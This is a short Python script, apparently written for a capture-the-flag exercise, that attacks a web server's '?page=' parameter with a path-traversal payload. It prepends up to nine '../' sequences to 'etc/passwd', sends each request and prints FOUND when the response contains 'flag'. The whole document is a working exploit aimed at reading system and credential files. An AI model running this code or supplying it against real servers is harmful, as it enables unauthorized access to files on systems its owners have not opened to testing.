import requests
from bs4 import BeautifulSoup
import sys

def path_traversal(base_url):
    # Ensure the base URL starts with http://
    if not base_url.startswith('http://'):
        base_url = 'http://' + base_url

    for _ in range(10):  # Limit the depth to prevent infinite loops
        full_url = f"{base_url}{'../' * _}etc/passwd"
        try:
            response = requests.get(full_url)
            print(full_url)
            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                if 'flag' in str(soup):
                    print('\033[32mFOUND\033[0m')
                    break
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <IP_ADDR>")
        sys.exit(1)

    ip = sys.argv[1]
    path_traversal(f"{ip}/?page=")